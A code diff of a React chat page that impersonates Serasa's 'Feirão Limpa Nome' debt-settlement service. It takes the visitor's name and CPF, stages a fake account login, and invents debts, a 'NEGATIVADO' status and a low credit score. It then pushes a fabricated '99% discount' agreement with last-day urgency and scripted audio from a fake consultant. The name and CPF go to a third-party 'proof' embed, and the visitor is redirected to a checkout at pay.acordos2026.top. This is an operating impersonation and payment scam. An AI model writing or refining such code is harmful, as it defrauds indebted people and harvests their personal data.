+      content: `<b>Obrigada!</b> <i>Agora, aguarde um instante...</i>`,
+      sender: "bot",
+      timestamp: new Date(),
+    }
+    addMessageWithTyping(m1, 2600)
+
+    // Mensagem 2
+    const t1 = setTimeout(() => {
+      const m2: Message = {
+        id: "s2-login",
         type: "text",
-        content: `${firstName}, seja bem-vindo(a) ao atendimento Feirão Limpa Nome da Serasa!`,
+        content: `<i>Efetuando login em sua conta Serasa...</i>`,
         sender: "bot",
         timestamp: new Date(),
-      },
-      {
-        id: "protocol",
-        type: "text",
-        content: "Protocolo do atendimento: AMY3PK8JS",
-        sender: "bot",
-        timestamp: new Date(),
-      },
-    ]
+      }
+      addMessageWithTyping(m2, 3000)
 
-    nextMessages.forEach((message, index) => {
-      setTimeout(
-        () => {
-          addMessageWithTyping(message, 2000)
+      // Mensagem 3
+      const t2 = setTimeout(() => {
+        const m3: Message = {
+          id: "s2-sucesso",
+          type: "text",
+          content: `<b>Login Efetuado com Sucesso!</b>`,
+          sender: "bot",
+          timestamp: new Date(),
+        }
+        addMessageWithTyping(m3, 2200)
 
-          if (message.id === "protocol") {
-            setTimeout(() => {
-              const lastDayBanner: Message = {
-                id: "last-day-banner",
+        // Mensagem 4
+        const t3 = setTimeout(() => {
+          const m4: Message = {
+            id: "s2-bemvindo",
+            type: "text",
+            content: `<b>${nomeCompleto}</b>, Seja bem vindo(a) a sua conta <b>Serasa</b>.`,
+            sender: "bot",
+            timestamp: new Date(),
+          }
+          addMessageWithTyping(m4, 3200)
+
+          // Mensagem 5
+          const t4 = setTimeout(() => {
+            const m5: Message = {
+              id: "s2-credores-text",
+              type: "text",
+              content: `Negocie dívidas com as seguintes empresas:`,
+              sender: "bot",
+              timestamp: new Date(),
+            }
+            addMessageWithTyping(m5, 2800)
+
+            // Imagem de credores
+            const t5 = setTimeout(() => {
+              const credoresImage: Message = {
+                id: "s2-credores-img",
                 type: "image",
                 content: "",
                 sender: "bot",
                 timestamp: new Date(),
-                imageUrl:
-                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/imagem-2025-06-02-220849093-gXe5072GbkjqMj6qzHzucTqlxbPp7S.png",
+                imageUrl: "/Screenshot_45.png",
               }
-              addMessageWithTyping(lastDayBanner, 2000)
+              addMessageWithTyping(credoresImage, 2000)
 
-              setTimeout(() => {
-                const lastDayMessage: Message = {
-                  id: "last-day",
+              // Botão Continuar
+              const t6 = setTimeout(() => {
+                const continuarText: Message = {
+                  id: "s2-toque-continuar",
                   type: "text",
-                  content:
-                    `Último dia do Feirão limpa nome em ${userData?.cidade || "sua região"}.\n\nDeseja consultar as ofertas disponíveis para o seu CPF?`,
+                  content: `(Toque em Continuar para Prosseguir)`,
                   sender: "bot",
                   timestamp: new Date(),
                   buttons: [
                     {
-                      text: "Quero Consultar",
-                      action: "quero-consultar",
+                      text: "Continuar",
+                      action: "continuar-feirao",
                     },
                   ],
                 }
-                addMessageWithTyping(lastDayMessage, 2000)
-              }, 4000)
-            }, 4000)
-          }
+                addMessageWithTyping(continuarText, 2200)
+              }, 3800)
+              activeTimeoutsRef.current.push(t6)
+            }, 3600)
+            activeTimeoutsRef.current.push(t5)
+          }, 4000)
+          activeTimeoutsRef.current.push(t4)
+        }, 3600)
+        activeTimeoutsRef.current.push(t3)
+      }, 3800)
+      activeTimeoutsRef.current.push(t2)
+    }, 3800)
+    activeTimeoutsRef.current.push(t1)
+  }
+
+  /* STEP 3: audio-3.mp3 + pergunta feirão */
+  const playAudioFeirao = () => {
+    hasTriggeredFeiraoRef.current = false
+
+    const audioMsg: Message = {
+      id: "audio-3-fernanda",
+      type: "audio",
+      content: "",
+      sender: "bot",
+      timestamp: new Date(),
+      audioUrl: "/audio-3.mp3",
+    }
+    addMessageWithTyping(audioMsg, 1800)
+  }
+
+  const triggerFeiraoQuestion = useCallback(() => {
+    if (hasTriggeredFeiraoRef.current) return
+    hasTriggeredFeiraoRef.current = true
+
+    const city = userData?.cidade || "Iracema"
+    const feiraoQuestion: Message = {
+      id: "feirao-question-ofertas",
+      type: "text",
+      content: `Último dia do Feirão limpa nome em <b>${city}</b>.\n\nDeseja consultar as ofertas disponíveis para o seu CPF?`,
+      sender: "bot",
+      timestamp: new Date(),
+      buttons: [
+        {
+          text: "Quero Consultar",
+          action: "quero-consultar",
         },
-        (index + 1) * 3000,
-      )
-    })
-  }
+      ],
+    }
+    const t = setTimeout(() => {
+      addMessageWithTyping(feiraoQuestion, 3000)
+    }, 1600)
+    activeTimeoutsRef.current.push(t)
+  }, [userData])
 
-  const startDebtAnalysis = () => {
-    const analysisMessage: Message = {
-      id: "analyzing",
+  /* STEP 4: Análise CPF + Score animado (291) */
+  const startDebtAnalysisFromScreenshots = () => {
+    const msg1: Message = {
+      id: "step4-aguarde",
       type: "text",
-      content: "Por favor, aguarde enquanto analiso a situação de seu CPF em nossos sistemas..",
+      content: `<i><b>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</b></i>`,
       sender: "bot",
       timestamp: new Date(),
     }
+    addMessageWithTyping(msg1, 2800)
 
-    addMessageWithTyping(analysisMessage, 2000)
-
-    setTimeout(() => {
-      const animatedGif: Message = {
-        id: "financial-life-gif",
-        type: "image",
-        content: "",
-        sender: "bot",
-        timestamp: new Date(),
-        imageUrl:
-          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/yvu93mi2pr47dwsd6utu3bwn-1-eYO2cEVEgAqrnd0TU6SrdJefLEVp1L.gif",
-      }
-      addMessageWithTyping(animatedGif, 2000)
-
-      setTimeout(() => {
-        const analysisComplete: Message = {
-          id: "analysis-complete",
-          type: "text",
-          content: "Análise concluída!",
-          sender: "bot",
-          timestamp: new Date(),
-        }
-        addMessageWithTyping(analysisComplete, 2000)
-
-        setTimeout(() => {
-          showDebtResults()
-        }, 4000)
-      }, 4000)
-    }, 4000)
-  }
-
-  const showDebtResults = () => {
-    const firstName = userData?.nome.split(" ")[0] || "Usuário"
-    const cpfFormatted = userData?.cpf || ""
-
-    const debtMessage: Message = {
-      id: "debt-results",
-      type: "text",
-      content: `${firstName}, identifiquei aqui 3 dívidas ativas no sistema.\n\nOs valores variam entre R$528,74 a R$5.237,78\nTotalizando uma dívida ativa de R$7.566,52 em seu CPF.\n\nSituação para o CPF ${cpfFormatted}: NEGATIVADO.\n\nDevido a alta taxa de Juros imposta pelo governo, suas dívidas estão se multiplicando rapidamente!`,
-      sender: "bot",
-      timestamp: new Date(),
-    }
-
-    addMessageWithTyping(debtMessage, 2000)
-
-    setTimeout(() => {
-      const firstAudio: Message = {
-        id: "first-audio",
-        type: "audio",
-        content: "",
-        sender: "bot",
-        timestamp: new Date(),
-        audioUrl:
-          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/g03ygdj5oj1kuc1smp1cgx2x-itY8rQg5gU2qFuOzIVmpAr4U30WfQx.mp3",
-      }
-      addMessageWithTyping(firstAudio, 2000)
-
-      setTimeout(() => {
-        const creditScoreImage: Message = {
-          id: "credit-score",
-          type: "score-gauge",
-          content: "",
-          sender: "bot",
-          timestamp: new Date(),
-          data: {
-            targetScore: 129,
-          },
-        }
-        addMessageWithTyping(creditScoreImage, 2000)
-
-        setTimeout(() => {
-          const verificationQuestion: Message = {
-            id: "verification-question",
-            type: "text",
-            content: "Deseja verificar se existe algum acordo disponível para você?",
-            sender: "bot",
-            timestamp: new Date(),
-            buttons: [
-              {
-                text: "Sim, Desejo",
-                action: "sim-desejo",
-              },
-            ],
-          }
-          addMessageWithTyping(verificationQuestion, 2000)
-        }, 4000)
-      }, 7000)
-    }, 4000)
-  }
-
-  const checkAgreements = () => {
-    const searchingMessage: Message = {
-      id: "searching-agreements",
-      type: "text",
-      content: "Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você...",
-      sender: "bot",
-      timestamp: new Date(),
-    }
-
-    addMessageWithTyping(searchingMessage, 2000)
-
-    setTimeout(() => {
-      const checkmarkImage: Message = {
-        id: "checkmark",
-        type: "image",
-        content: "",
-        sender: "bot",
-        timestamp: new Date(),
-        imageUrl:
-          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar2-Us2rfDwlpKeS7ZMXvmETuwpsIJ4PbM.png",
-      }
-      addMessageWithTyping(checkmarkImage, 2000)
-
-      setTimeout(() => {
-        const newsMessage: Message = {
-          id: "news",
-          type: "text",
-          content:
-            "Notícia: Somente hoje, mais de 12.872,00 brasileiros negociaram suas dívidas no Feirão Limpa Nome Serasa online!",
-          sender: "bot",
-          timestamp: new Date(),
-        }
-        addMessageWithTyping(newsMessage, 2000)
-
-        setTimeout(() => {
-          const videoEmbed: Message = {
-            id: "video-embed",
-            type: "video",
-            content: "",
-            sender: "bot",
-            timestamp: new Date(),
-            videoUrl: "https://player.vimeo.com/video/1032300787?badge=0&autopause=0&player_id=0&app_id=58479",
-          }
-          addMessageWithTyping(videoEmbed, 2000)
-
-          setTimeout(() => {
-            showAgreementDetails()
-          }, 18000)
-        }, 4000)
-      }, 4000)
-    }, 4000)
-  }
-
-  const showAgreementDetails = () => {
-    const agreementFound: Message = {
-      id: "agreement-found",
-      type: "text",
-      content:
-        "Acordo encontrado!\n\n1 (um) acordo foi encontrado para:\n\n" + `${userData?.nome} (CPF ${userData?.cpf})`,
-      sender: "bot",
-      timestamp: new Date(),
-    }
-
-    addMessageWithTyping(agreementFound, 2000)
-
-    setTimeout(() => {
-      const accessingAgreement: Message = {
-        id: "accessing-agreement",
+    const t1 = setTimeout(() => {
+      const msg2: Message = {
+        id: "step4-consultando",
         type: "text",
-        content: "Acessando o acordo, 83N2L618362E aguarde...",
+        content: `<i><b>Consultando..</b></i>`,
         sender: "bot",
         timestamp: new Date(),
       }
-      addMessageWithTyping(accessingAgreement, 2000)
+      addMessageWithTyping(msg2, 2400)
 
-      setTimeout(() => {
-        const today = new Date().toLocaleDateString("pt-BR")
-        const agreementInfo: Message = {
-          id: "agreement-info",
-          type: "agreement-document",
+      const t2 = setTimeout(() => {
+        const bannerFeirao: Message = {
+          id: "step4-banner-analise",
+          type: "image",
           content: "",
           sender: "bot",
           timestamp: new Date(),
-          data: {
-            acordoId: "83N2L618362E",
-            nome: userData?.nome,
-            cpf: userData?.cpf,
-            valorDivida: "7.566,52",
-            valorContrato: "78,47",
-            desconto: "98,7",
-            valorDesconto: "7.488,05",
-            vencimento: today,
-          },
+          imageUrl: "/analise-feirao.webp",
         }
-        addMessageWithTyping(agreementInfo, 2000)
+        addMessageWithTyping(bannerFeirao, 2000)
 
-        setTimeout(() => {
-          const appInterfaceImage: Message = {
-            id: "debt-offers-app",
-            type: "image",
+        const t3 = setTimeout(() => {
+          const analiseConcluida: Message = {
+            id: "step4-concluida",
+            type: "text",
+            content: `<i><b>Análise concluída!</b></i>`,
+            sender: "bot",
+            timestamp: new Date(),
+          }
+          addMessageWithTyping(analiseConcluida, 2400)
+
+          const t4 = setTimeout(() => {
+            const dividasMsg: Message = {
+              id: "step4-dividas",
+              type: "text",
+              content: `Identificamos <b>4 dívidas ativas</b> no sistema.\nOs valores variam entre <b>R$ 1.728,74 a R$ 5.278,23</b> de dívida <b>em seu CPF.</b>`,
+              sender: "bot",
+              timestamp: new Date(),
+            }
+            addMessageWithTyping(dividasMsg, 3600)
+
+            const t5 = setTimeout(() => {
+              const negativadoMsg: Message = {
+                id: "step4-negativado",
+                type: "text",
+                content: `<i>Situação para CPF:</i>\n\n<b>NEGATIVADO.</b>`,
+                sender: "bot",
+                timestamp: new Date(),
+              }
+              addMessageWithTyping(negativadoMsg, 2800)
+
+              const t6 = setTimeout(() => {
+                const scoreIntroMsg: Message = {
+                  id: "step4-score-intro",
+                  type: "text",
+                  content: `Segundo nossos registros, seu SCORE é considerado muito baixo <b>(alto risco para crédito):</b>`,
+                  sender: "bot",
+                  timestamp: new Date(),
+                }
+                addMessageWithTyping(scoreIntroMsg, 3200)
+
+                const t7 = setTimeout(() => {
+                  const scoreGaugeMsg: Message = {
+                    id: "step4-score-gauge",
+                    type: "score-gauge",
+                    content: "",
+                    sender: "bot",
+                    timestamp: new Date(),
+                    data: {
+                      targetScore: 291,
+                    },
+                  }
+                  addMessageWithTyping(scoreGaugeMsg, 2200)
+
+                  const t8 = setTimeout(() => {
+                    const perguntaAcordoMsg: Message = {
+                      id: "step4-pergunta-acordo",
+                      type: "text",
+                      content: `Você deseja verificar se existe algum acordo com desconto disponível para você?`,
+                      sender: "bot",
+                      timestamp: new Date(),
+                      buttons: [
+                        {
+                          text: "Buscar Acordo",
+                          action: "sim-desejo",
+                        },
+                      ],
+                    }
+                    addMessageWithTyping(perguntaAcordoMsg, 2800)
+                  }, 5500)
+                  activeTimeoutsRef.current.push(t8)
+                }, 3800)
+                activeTimeoutsRef.current.push(t7)
+              }, 4200)
+              activeTimeoutsRef.current.push(t6)
+            }, 4400)
+            activeTimeoutsRef.current.push(t5)
+          }, 3800)
+          activeTimeoutsRef.current.push(t4)
+        }, 4000)
+        activeTimeoutsRef.current.push(t3)
+      }, 3600)
+      activeTimeoutsRef.current.push(t2)
+    }, 3800)
+    activeTimeoutsRef.current.push(t1)
+  }
+
+  /* STEP 5: Buscar Acordo */
+  const stepBuscarAcordo = () => {
+    const rawCpf = userData?.cpf ? userData.cpf.replace(/\D/g, "") : ""
+    const nome = userData?.nome || "Cliente"
+
+    const aguardeMsg: Message = {
+      id: "s5-aguarde-acordo",
+      type: "text",
+      content: `Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você...`,
+      sender: "bot",
+      timestamp: new Date(),
+    }
+    addMessageWithTyping(aguardeMsg, 3000)
+
+    const t1 = setTimeout(() => {
+      const capturar2Img: Message = {
+        id: "s5-capturar2-img",
+        type: "image",
+        content: "",
+        sender: "bot",
+        timestamp: new Date(),
+        imageUrl: "/Capturar2.png",
+      }
+      addMessageWithTyping(capturar2Img, 2200)
+
+      const t2 = setTimeout(() => {
+        const acordoEncontradoMsg: Message = {
+          id: "s5-acordo-encontrado",
+          type: "text",
+          content: `<b>Acordo encontrado!</b>\n\n1 (um) acordo foi encontrado para:\n\n<b>${nome}</b> (CPF ${rawCpf})`,
+          sender: "bot",
+          timestamp: new Date(),
+          buttons: [
+            {
+              text: "VER ACORDO",
+              action: "ver-acordo",
+            },
+          ],
+        }
+        addMessageWithTyping(acordoEncontradoMsg, 3000)
+      }, 4200)
+      activeTimeoutsRef.current.push(t2)
+    }, 4400)
+    activeTimeoutsRef.current.push(t1)
+  }
+
+  /* STEP 6: VER ACORDO (Áudio 2: audio-4.mp3 com duração de 43.18s)
+     Garantir que as mensagens seguintes tenham delays humanizados e acompanhem a fala da Fernanda,
+     e a pergunta/botão final só apareça DEPOIS que o áudio 2 já terminou de rodar por completo!
+  */
+  const stepVerAcordo = () => {
+    const nome = userData?.nome || "Cliente"
+    const firstName = nome.split(" ")[0]
+    const formattedCpf = formatCPF(userData?.cpf || "")
+    const today = new Date().toLocaleDateString("pt-BR")
+
+    // Envia o segundo áudio (audio-4.mp3 - 43.18s)
+    const audio4Msg: Message = {
+      id: "audio-4-fernanda",
+      type: "audio",
+      content: "",
+      sender: "bot",
+      timestamp: new Date(),
+      audioUrl: "/audio-4.mp3",
+    }
+    addMessageWithTyping(audio4Msg, 1600)
+
+    // Mensagem 1: Parabéns (entra aos ~11s de áudio, digitando a partir de 8.5s)
+    const t1 = setTimeout(() => {
+      const parabensMsg: Message = {
+        id: "s6-parabens-super-acordo",
+        type: "text",
+        content: `Parabéns <b>${firstName}!</b>\n\nPode comemorar! Encontramos um <b>SUPER ACORDO DE 99% DE DESCONTO</b> para você!`,
+        sender: "bot",
+        timestamp: new Date(),
+      }
+      addMessageWithTyping(parabensMsg, 3000)
+
+      // Mensagem 2: Acessando acordo (entra aos ~21s de áudio, digitando a partir de 18s)
+      const t2 = setTimeout(() => {
+        const acessandoMsg: Message = {
+          id: "s6-acessando-acordo",
+          type: "text",
+          content: `<i>Acessando o acordo</i> <b style="color:#e6007e">83N2L618362E...</b>`,
+          sender: "bot",
+          timestamp: new Date(),
+        }
+        addMessageWithTyping(acessandoMsg, 2800)
+
+        // Mensagem 3: Termo e Documento do Acordo (entra aos ~28s de áudio)
+        const t3 = setTimeout(() => {
+          const termoDocumento: Message = {
+            id: "s6-termo-documento",
+            type: "agreement-document",
             content: "",
             sender: "bot",
             timestamp: new Date(),
-            imageUrl:
-              "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar23-wU6nxu4g2IZVPqWygtLdlJaJQNbI6e.png",
+            data: {
+              acordoId: "83N2L618362E",
+              nome: userData?.nome,
+              cpf: userData?.cpf,
+              valorDivida: "7.566,52",
+              valorContrato: "78,47",
+              desconto: "99,0",
+              valorDesconto: "7.488,05",
+              vencimento: today,
+            },
           }
-          addMessageWithTyping(appInterfaceImage, 2000)
+          addMessageWithTyping(termoDocumento, 2200)
 
-          setTimeout(() => {
-            const secondAudio: Message = {
-              id: "second-audio",
-              type: "audio",
+          // Mensagem 4: Informações do acordo (entra aos ~37s de áudio)
+          const t4 = setTimeout(() => {
+            const infoAcordoMsg: Message = {
+              id: "s6-info-acordo",
+              type: "text",
+              content: `Informações do acordo <b style="color:#e6007e">83N2L618362E</b> para:\n\n<b>Nome:</b> ${nome}\n\n<b>CPF:</b> ${formattedCpf}`,
+              sender: "bot",
+              timestamp: new Date(),
+            }
+            addMessageWithTyping(infoAcordoMsg, 3000)
+
+            // Mensagem 5: Aviso de Titular (entra aos ~44s, quando o áudio 2 de 43.18s termina)
+            const t5 = setTimeout(() => {
+              const titularMsg: Message = {
+                id: "s6-titular-aviso",
+                type: "text",
+                content: `O contrato atual é válido apenas para o titular: <b>${nome}</b> portador(a) do CPF: <b>${formattedCpf}</b>`,
+                sender: "bot",
+                timestamp: new Date(),
+              }
+              addMessageWithTyping(titularMsg, 2800)
+
+              // Mensagem 6 + Botão: Pergunta final (entra aos ~51s, áudio 2 totalmente finalizado)
+              const t6 = setTimeout(() => {
+                const perguntaFinalMsg: Message = {
+                  id: "s6-pergunta-final",
+                  type: "text",
+                  content: `Você gostaria de realizar o seu acordo com <b>99% DE DESCONTO</b> para quitar todas as suas dívidas e ter seu nome limpo novamente por apenas <b>R$ 78,47</b>?`,
+                  sender: "bot",
+                  timestamp: new Date(),
+                  buttons: [
+                    {
+                      text: "Confirmar acordo e limpar o nome",
+                      action: "confirmar-acordo",
+                    },
+                  ],
+                }
+                addMessageWithTyping(perguntaFinalMsg, 3200)
+              }, 6000)
+              activeTimeoutsRef.current.push(t6)
+            }, 6500)
+            activeTimeoutsRef.current.push(t5)
+          }, 6500)
+          activeTimeoutsRef.current.push(t4)
+        }, 6500)
+        activeTimeoutsRef.current.push(t3)
+      }, 7000)
+      activeTimeoutsRef.current.push(t2)
+    }, 8500)
+    activeTimeoutsRef.current.push(t1)
+  }
+
+  /* STEP 7: Confirmar acordo e limpar o nome (Áudio 3: audio-5.mp3 - 16.77s) */
+  const stepConfirmarAcordo = () => {
+    // Pausa qualquer áudio anterior imediatamente para evitar qualquer sobreposição
+    if (typeof document !== "undefined") {
+      document.querySelectorAll("audio").forEach((el) => {
+        try {
+          el.pause()
+        } catch {}
+      })
+    }
+
+    const audio5Msg: Message = {
+      id: "audio-5-fernanda",
+      type: "audio",
+      content: "",
+      sender: "bot",
+      timestamp: new Date(),
+      audioUrl: "/audio-5.mp3",
+    }
+    addMessageWithTyping(audio5Msg, 1600)
+
+    // Aguarda o término do áudio 3 (~17s) para enviar a pergunta seguinte
+    const t = setTimeout(() => {
+      const desejaMsg: Message = {
+        id: "s7-deseja-realizar",
+        type: "text",
+        content: `Deseja realizar o acordo e ter seu nome limpo ainda hoje?`,
+        sender: "bot",
+        timestamp: new Date(),
+        buttons: [
+          {
+            text: "Continuar com pagamento",
+            action: "continuar-pagamento",
+          },
+        ],
+      }
+      addMessageWithTyping(desejaMsg, 2800)
+    }, 17500)
+    activeTimeoutsRef.current.push(t)
+  }
+
+  /* STEP 8: Continuar com pagamento (Áudio 4: audio-6.mp3 - 29.10s) */
+  const stepContinuarPagamento = () => {
+    // Pausa qualquer áudio anterior
+    if (typeof document !== "undefined") {
+      document.querySelectorAll("audio").forEach((el) => {
+        try {
+          el.pause()
+        } catch {}
+      })
+    }
+
+    const rawCpf = userData?.cpf ? userData.cpf.replace(/\D/g, "") : ""
+    const nome = userData?.nome || "Cliente"
+
+    const audio6Msg: Message = {
+      id: "audio-6-fernanda",
+      type: "audio",
+      content: "",
+      sender: "bot",
+      timestamp: new Date(),
+      audioUrl: "/audio-6.mp3",
+    }
+    addMessageWithTyping(audio6Msg, 1600)
+
+    // Mensagem aos 8s de áudio
+    const t1 = setTimeout(() => {
+      const confirmandoMsg: Message = {
+        id: "s8-confirmando",
+        type: "text",
+        content: `<i>Confirmando o acordo...</i>`,
+        sender: "bot",
+        timestamp: new Date(),
+      }
+      addMessageWithTyping(confirmandoMsg, 2600)
+
+      // Mensagem aos 17s de áudio
+      const t2 = setTimeout(() => {
+        const serasaInformaMsg: Message = {
+          id: "s8-serasa-informa",
+          type: "text",
+          content: `<b>SERASA INFORMA:</b>\nAo efetuar o pagamento do acordo, todas as dívidas em aberto no CPF <b>${rawCpf}</b> serão removidas em 1 hora, e você terá o seu nome limpo novamente!`,
+          sender: "bot",
+          timestamp: new Date(),
+        }
+        addMessageWithTyping(serasaInformaMsg, 3200)
+
+        // Mensagem aos 25s de áudio
+        const t3 = setTimeout(() => {
+          const parabensConfirmadoMsg: Message = {
+            id: "s8-parabens-confirmado",
+            type: "text",
+            content: `<b>Parabéns!</b>\nSeu acordo foi confirmado.`,
+            sender: "bot",
+            timestamp: new Date(),
+          }
+          addMessageWithTyping(parabensConfirmadoMsg, 2600)
+
+          // Comprovante embed aos 31s (após o término do áudio 6 de 29s)
+          const t4 = setTimeout(() => {
+            const paymentProofEmbed: Message = {
+              id: "s8-payment-proof-embed",
+              type: "embed",
               content: "",
               sender: "bot",
               timestamp: new Date(),
-              audioUrl:
-                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/xurd2lz77g2r2cypw37j1wab-nu5w6XH0ufVUnH7S5ZN2FBAPUVGMgr.mp3",
+              embedUrl: `https://cerulean-bavarois-8fa9a8.netlify.app/proof-2/?name=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(rawCpf)}&value=78,47`,
             }
-            addMessageWithTyping(secondAudio, 2000)
+            addMessageWithTyping(paymentProofEmbed, 2400)
 
-            setTimeout(() => {
-              const finalQuestion: Message = {
-                id: "final-question",
-                type: "text",
-                content: "Deseja realizar o acordo e ter seu nome limpo ainda hoje?",
+            // Guia gerada
+            const t5 = setTimeout(() => {
+              const paymentGenerated: Message = {
+                id: "s8-payment-generated",
+                type: "payment-guide",
+                content: `A guia de pagamento foi gerada para o acordo 83N2L618362E!`,
                 sender: "bot",
                 timestamp: new Date(),
-                buttons: [
-                  {
-                    text: "Sim, desejo quitar minhas dívidas.",
-                    action: "sim-quitar",
-                  },
-                ],
+                data: {
+                  acordoId: "83N2L618362E",
+                  nome: nome,
+                  cpf: rawCpf,
+                  valor: "78,47",
+                },
               }
-              addMessageWithTyping(finalQuestion, 2000)
-            }, 21000)
-          }, 4000)
-        }, 4000)
-      }, 4000)
-    }, 4000)
-  }
+              addMessageWithTyping(paymentGenerated, 2600)
 
-  const confirmAgreement = () => {
-    const confirmingMessage: Message = {
-      id: "confirming",
-      type: "text",
-      content: "Confirmando o acordo...",
-      sender: "bot",
-      timestamp: new Date(),
-    }
-
-    addMessageWithTyping(confirmingMessage, 2000)
-
-    setTimeout(() => {
-      const serasaInfo: Message = {
-        id: "serasa-info",
-        type: "text",
-        content: `SERASA INFORMA:\nAo efetuar o pagamento do acordo, todas as dívidas em aberto no CPF ${userData?.cpf} serão removidas em 1 hora, e você terá o seu nome limpo novamente!`,
-        sender: "bot",
-        timestamp: new Date(),
-      }
-      addMessageWithTyping(serasaInfo, 2000)
-
-      setTimeout(() => {
-        const congratulations: Message = {
-          id: "congratulations",
-          type: "text",
-          content: "Parabéns!\nSeu acordo foi confirmado.",
-          sender: "bot",
-          timestamp: new Date(),
-        }
-        addMessageWithTyping(congratulations, 2000)
-
-        setTimeout(() => {
-          const paymentProofEmbed: Message = {
-            id: "payment-proof-embed",
-            type: "embed",
-            content: "",
-            sender: "bot",
-            timestamp: new Date(),
-            embedUrl: `https://cerulean-bavarois-8fa9a8.netlify.app/proof-2/?name=${encodeURIComponent(userData?.nome || "")}&cpf=${encodeURIComponent(userData?.cpf || "")}&value=78,47`,
-          }
-          addMessageWithTyping(paymentProofEmbed, 3000)
-
-          setTimeout(() => {
-            const paymentGenerated: Message = {
-              id: "payment-generated",
-              type: "payment-guide",
-              content: `A guia de pagamento foi gerada para o acordo 83N2L618362E!`,
-              sender: "bot",
-              timestamp: new Date(),
-              data: {
-                acordoId: "83N2L618362E",
-                nome: userData?.nome || "Cliente",
-                cpf: userData?.cpf || "",
-                valor: "78,47",
-              },
-            }
-            addMessageWithTyping(paymentGenerated, 2000)
-
-            setTimeout(() => {
-              const paymentButton: Message = {
-                id: "payment-button",
-                type: "text",
-                content: "Clique no botão a seguir para acessar a página de pagamento seguro:",
-                sender: "bot",
-                timestamp: new Date(),
-                buttons: [
-                  {
-                    text: "IR PARA A PAGINA DE PAGAMENTO",
-                    action: "acessar-pagamento",
-                  },
-                ],
-              }
-              addMessageWithTyping(paymentButton, 2000)
-            }, 4000)
-          }, 4000)
-        }, 4000)
-      }, 4000)
-    }, 4000)
+              // Botão final para checkout
+              const t6 = setTimeout(() => {
+                const paymentButton: Message = {
+                  id: "s8-btn-pagamento",
+                  type: "text",
+                  content: `Clique no botão abaixo para acessar a página de pagamento seguro e liberar seu comprovante:`,
+                  sender: "bot",
+                  timestamp: new Date(),
+                  buttons: [
+                    {
+                      text: "IR PARA PAGINA DE PAGAMENTO",
+                      action: "acessar-pagamento",
+                    },
+                  ],
+                }
+                addMessageWithTyping(paymentButton, 2800)
+              }, 4500)
+              activeTimeoutsRef.current.push(t6)
+            }, 5000)
+            activeTimeoutsRef.current.push(t5)
+          }, 5500)
+          activeTimeoutsRef.current.push(t4)
+        }, 5500)
+        activeTimeoutsRef.current.push(t3)
+      }, 7000)
+      activeTimeoutsRef.current.push(t2)
+    }, 8000)
+    activeTimeoutsRef.current.push(t1)
   }
 
   const redirectToPayment = () => {
     try {
       const checkoutUrl = new URL("https://pay.acordos2026.top/ODAK3LXnLeo3E6V")
 
-      // Preserve current URL tracking params (UTMs, sck, etc)
       if (typeof window !== "undefined") {
         const currentParams = new URLSearchParams(window.location.search)
         currentParams.forEach((v, k) => {
@@ -1172,19 +1610,19 @@ function ChatContent() {
 
   if (!cpf) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-pink-50 to-pink-100 flex items-center justify-center">
-        <Card className="p-8 text-center bg-white shadow-xl border-0">
-          <div className="w-16 h-16 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-4">
+      <div className="min-h-screen bg-gradient-to-br from-pink-50 to-pink-100 flex items-center justify-center p-4">
+        <Card className="p-8 text-center bg-white shadow-xl border-0 max-w-sm w-full">
+          <div className="w-16 h-16 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-4 overflow-hidden border-2 border-pink-200">
             <Image
-              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
-              alt="Serasa"
-              width={48}
-              height={48}
-              className="w-12 h-12 rounded-full"
+              src="/fernanda-avatar.jpg"
+              alt="Fernanda Serasa"
+              width={64}
+              height={64}
+              className="w-full h-full object-cover"
             />
           </div>
-          <h1 className="text-xl font-semibold text-gray-800 mb-4">CPF nao encontrado</h1>
-          <p className="text-gray-600">Por favor, volte e insira seu CPF novamente.</p>
+          <h1 className="text-xl font-bold text-gray-800 mb-2">CPF não informado</h1>
+          <p className="text-sm text-gray-600">Por favor, volte à página inicial e insira seu CPF para consultar suas dívidas.</p>
         </Card>
       </div>
     )
@@ -1192,43 +1630,73 @@ function ChatContent() {
 
   return (
     <div className="fixed inset-0 h-[100dvh] flex flex-col bg-gradient-to-br from-pink-50 to-white overflow-hidden">
-      {/* Header Fixo no Topo */}
-      <header className="flex-shrink-0 z-50 bg-pink-600 text-white px-4 pt-[max(0.75rem,env(safe-area-inset-top))] pb-3 sm:py-4 shadow-md select-none">
-        <div className="max-w-4xl mx-auto flex items-center gap-3">
-          <Image
-            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
-            alt="Serasa"
-            width={120}
-            height={40}
-            className="h-7 sm:h-8 w-auto object-contain"
-            priority
-          />
-          <div className="flex-1 min-w-0">
-            <h1 className="font-semibold text-base sm:text-lg leading-tight truncate">Atendimento Serasa</h1>
-            <p className="text-xs sm:text-sm opacity-90 flex items-center gap-1.5 leading-tight truncate">
-              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse flex-shrink-0"></span>
-              Renata - Consultora Online
-            </p>
+      {/* Header Premium com Identidade Oficial Serasa + Dados do Cliente com Asteriscos */}
+      <header className="flex-shrink-0 z-50 bg-[#e6007e] text-white shadow-md select-none border-b border-pink-700/30">
+        {/* Linha Superior: Logo, Consultora Online e Avatar */}
+        <div className="max-w-4xl mx-auto px-4 pt-[max(0.6rem,env(safe-area-inset-top))] pb-2 flex items-center justify-between gap-3">
+          <div className="flex items-center gap-2.5 min-w-0">
+            <Image
+              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
+              alt="Serasa"
+              width={105}
+              height={34}
